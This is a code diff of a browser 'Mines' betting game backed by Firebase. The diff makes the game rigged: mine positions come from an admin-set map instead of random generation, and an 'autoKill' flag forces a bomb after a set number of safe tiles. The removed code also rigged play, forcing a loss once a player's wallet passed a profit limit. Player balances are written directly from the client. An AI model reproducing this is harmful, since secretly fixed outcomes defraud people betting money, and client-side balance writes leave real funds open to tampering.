@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Jalwa Mines Pro - Auto Cycle</title>
+    <title>Jalwa Mines Pro - Fully Synced</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -30,7 +30,6 @@
         .btn-bet:disabled { background: #2f4553; color: #8899a6; box-shadow: none; cursor: not-allowed; }
         .btn-cashout { background: #ff9800; color: #000; box-shadow: 0 4px 0 #b36b00; display: none; }
         #status-msg { text-align: center; margin-bottom: 10px; font-weight: bold; min-height: 24px; font-size: 14px; }
-        .bet-info { color: var(--gold); text-align: center; font-size: 12px; margin-bottom: 10px; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -48,7 +47,6 @@
 
 <div class="game-container">
     <div id="status-msg">READY TO PLAY</div>
-    <div id="betInfo" class="bet-info">NEXT BET IN 00s</div>
     <div class="grid" id="mineGrid"></div>
 
     <div class="controls">
@@ -58,12 +56,14 @@
         <span class="label-sm">Mines</span>
         <div class="input-box">
             <select id="mineCount">
-                <option value="1">1 Mine</option><option value="3" selected>3 Mines</option>
-                <option value="5">5 Mines</option><option value="10">10 Mines</option>
+                <option value="1">1 Mine</option>
+                <option value="3" selected>3 Mines</option>
+                <option value="5">5 Mines</option>
+                <option value="10">10 Mines</option>
             </select>
         </div>
 
-        <button id="btnBet" class="btn btn-bet" onclick="startGame()">Place Bet (10s Left)</button>
+        <button id="btnBet" class="btn btn-bet" onclick="startGame()">Place Bet</button>
         <button id="btnCashout" class="btn btn-cashout" onclick="cashout()">Cashout</button>
     </div>
 </div>
@@ -75,7 +75,7 @@
     
     const userId = localStorage.getItem('jalwa_user_phone') || 'Guest';
     let wallet = 0, betAmount = 0, mines = [], gameActive = false, openedTiles = 0;
-    let profitLimit = 350, currentP = "", bettingEnabled = false;
+    let bettingEnabled = false;
 
     // --- SYSTEM SYNC (1 MIN CYCLE) ---
     function syncSystem() {
@@ -83,9 +83,7 @@
         const sec = now.getSeconds();
         const rem = 60 - sec; 
         
-        // 10 Seconds Betting Phase (0-10 sec of every minute)
         bettingEnabled = (sec < 10);
-        
         const pId = now.getFullYear().toString() + (now.getMonth() + 1).toString().padStart(2, '0') + now.getDate().toString().padStart(2, '0') + (now.getHours() * 60 + now.getMinutes()).toString().padStart(4, '0');
         
         document.getElementById('pIdDisplay').innerText = pId;
@@ -93,41 +91,23 @@
 
         if(bettingEnabled) {
             document.getElementById('phaseTxt').innerText = "BETTING";
-            document.getElementById('phaseTxt').style.color = "var(--primary)";
             document.getElementById('btnBet').disabled = false;
             document.getElementById('btnBet').innerText = `Place Bet (${10 - sec}s)`;
-            document.getElementById('betInfo').innerText = "PLACE YOUR BET NOW";
         } else {
             document.getElementById('phaseTxt').innerText = "GAMING";
-            document.getElementById('phaseTxt').style.color = "var(--gold)";
             document.getElementById('btnBet').disabled = true;
             document.getElementById('btnBet').innerText = "BET CLOSED";
-            document.getElementById('betInfo').innerText = "GAME IN PROGRESS...";
         }
 
-        // AUTO CASHOUT LOGIC (At 59th second)
-        if (sec === 59 && gameActive) {
-            autoCashout();
-        }
-
-        // RESET GRID FOR NEW PERIOD (At 0th second)
-        if (sec === 0) {
-            if(!gameActive) createGrid(); 
-            document.getElementById('status-msg').innerText = "NEW ROUND STARTED";
-        }
-
-        currentP = pId;
+        if (sec === 59 && gameActive) autoCashout();
+        if (sec === 0 && !gameActive) createGrid();
     }
     setInterval(syncSystem, 1000);
 
-    // --- GAME LOGIC ---
+    // --- DATA LOAD ---
     db.ref('users/' + userId).on('value', snap => {
         wallet = snap.val()?.balance || 0;
         document.getElementById('balance').innerText = wallet.toFixed(2);
-    });
-
-    db.ref('gameSettings/mines').on('value', snap => {
-        if(snap.val()) profitLimit = snap.val().limit;
     });
 
     function createGrid() {
@@ -141,44 +121,48 @@
         }
     }
 
+    // --- SYNCED START GAME ---
     function startGame() {
         if(!bettingEnabled) return;
         betAmount = parseFloat(document.getElementById('betAmt').value);
         if (wallet < betAmount || betAmount < 1) return;
 
-        db.ref('users/' + userId).update({ balance: wallet - betAmount });
-        gameActive = true; openedTiles = 0; mines = generateMines();
-        
-        document.getElementById('btnBet').style.display = 'none';
-        document.getElementById('btnCashout').style.display = 'block';
-        document.getElementById('status-msg').style.color = 'var(--primary)';
-        document.getElementById('status-msg').innerText = "Multiplier: 1.00x";
-        createGrid();
+        // FETCH BOMB POSITIONS FROM ADMIN PANEL
+        db.ref('gameSettings/mines/currentMap').once('value', snap => {
+            mines = snap.val() || [2, 7, 12, 18, 22]; // Default fallback
+
+            db.ref('users/' + userId).update({ balance: wallet - betAmount });
+            gameActive = true; openedTiles = 0;
+            
+            document.getElementById('btnBet').style.display = 'none';
+            document.getElementById('btnCashout').style.display = 'block';
+            document.getElementById('status-msg').style.color = 'var(--primary)';
+            document.getElementById('status-msg').innerText = "Multiplier: 1.00x";
+            createGrid();
+        });
     }
 
-    function generateMines() {
-        let m = [];
-        let count = parseInt(document.getElementById('mineCount').value);
-        while(m.length < count) {
-            let r = Math.floor(Math.random() * 25);
-            if(!m.includes(r)) m.push(r);
-        }
-        return m;
-    }
-
+    // --- SYNCED REVEAL WITH AUTO-KILL ---
     function reveal(idx, el) {
         if (!gameActive || el.classList.contains('open')) return;
-        let forceBomb = (wallet > profitLimit && openedTiles >= 2);
-        if (mines.includes(idx) || forceBomb) {
-            el.innerHTML = '<i class="fas fa-bomb"></i>';
-            el.classList.add('open', 'bomb');
-            gameOver(false);
-        } else {
-            el.innerHTML = '<i class="fas fa-gem"></i>';
-            el.classList.add('open', 'diamond');
-            openedTiles++;
-            updateMultiplier();
-        }
+
+        db.ref('gameSettings/mines').once('value', snap => {
+            let config = snap.val() || {};
+            let maxSafe = config.maxSafe || 3;
+            let autoKill = config.autoKill || false;
+            let forceBomb = (autoKill && openedTiles >= maxSafe);
+
+            if (mines.includes(idx) || forceBomb) {
+                el.innerHTML = '<i class="fas fa-bomb"></i>';
+                el.classList.add('open', 'bomb');
+                gameOver(false);
+            } else {
+                el.innerHTML = '<i class="fas fa-gem"></i>';
+                el.classList.add('open', 'diamond');
+                openedTiles++;
+                updateMultiplier();
+            }
+        });
     }
 
     function updateMultiplier() {
@@ -191,17 +175,13 @@
     function cashout() {
         if(!gameActive) return;
         let mult = parseFloat(document.getElementById('status-msg').innerText.split(' ')[1]);
-        let win = betAmount * mult;
-        db.ref('users/' + userId).update({ balance: wallet + win });
+        db.ref('users/' + userId).update({ balance: wallet + (betAmount * mult) });
         gameOver(true);
     }
 
     function autoCashout() {
         let mult = parseFloat(document.getElementById('status-msg').innerText.split(' ')[1]);
-        if(mult > 1) {
-            let win = betAmount * mult;
-            db.ref('users/' + userId).update({ balance: wallet + win });
-        }
+        if(mult > 1) db.ref('users/' + userId).update({ balance: wallet + (betAmount * mult) });
         gameOver(true);
     }
 
@@ -209,8 +189,7 @@
         gameActive = false;
         document.getElementById('btnBet').style.display = 'block';
         document.getElementById('btnCashout').style.display = 'none';
-        if(!win) document.getElementById('status-msg').innerText = "BOMB EXPLODED!";
-        else document.getElementById('status-msg').innerText = "ROUND FINISHED";
+        document.getElementById('status-msg').innerText = win ? "ROUND FINISHED" : "BOMB EXPLODED!";
         
         const tiles = document.querySelectorAll('.tile');
         mines.forEach(m => { if(!tiles[m].classList.contains('open')) { tiles[m].innerHTML = '<i class="fas fa-bomb" style="opacity:0.3"></i>'; tiles[m].classList.add('open'); } });
